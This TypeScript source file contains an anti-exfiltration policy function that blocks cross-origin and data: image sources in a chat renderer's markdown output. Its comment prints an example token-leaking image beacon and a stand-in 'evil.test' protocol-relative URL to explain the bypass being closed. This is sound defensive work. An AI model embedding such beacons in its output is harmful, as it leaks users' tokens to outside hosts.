/**
 * Pure classification of a markdown image `src` against the chat renderer's
 * anti-exfil policy (message-scroll-perf ITEM-3 extracted this from the inline
 * `img` override so the security decision is unit-testable — DEC-3). The policy
 * itself is UNCHANGED from the original inline logic:
 *
 * - empty / non-string          → `empty`   (render nothing)
 * - root-relative (`/…` not `//`) → `allowed` (same-origin app asset)
 * - same-origin absolute URL     → `allowed`
 * - protocol-relative (`//host`)  → origin-checked (blocked if cross-origin)
 * - `data:` URI                  → `blocked` (exfil vector / heavy inline payload)
 * - any other origin             → `blocked`
 * - malformed URL                → `blocked`
 *
 * `blocked` src render a `BlockedImage` chip; `allowed` src render a
 * height-reserving `ReservedImage`. Blocking external / `data:` images prevents
 * `<img src="https://exfil/?token=…">` beacons embedded in model/markdown output.
 *
 * NOTE: a protocol-relative URL (`//evil.test/x`) starts with `/` but resolves
 * to a DIFFERENT origin — the `!startsWith('//')` guard routes it through the
 * origin check instead of auto-allowing it (the original inline logic's bare
 * `startsWith('/')` let such a URL through — a latent exfil hole this closes).
 */
export type ImageSrcVerdict = 'empty' | 'allowed' | 'blocked'

export function classifyImageSrc(
  src: unknown,
  origin: string,
): ImageSrcVerdict {
  if (typeof src !== 'string' || src.length === 0) return 'empty'
  if (src.startsWith('/') && !src.startsWith('//')) return 'allowed'
  if (src.startsWith('data:')) return 'blocked'
  try {
    const u = new URL(src, origin)
    if (u.origin === origin) return 'allowed'
  } catch {
    /* malformed → blocked */
  }
  return 'blocked'
}
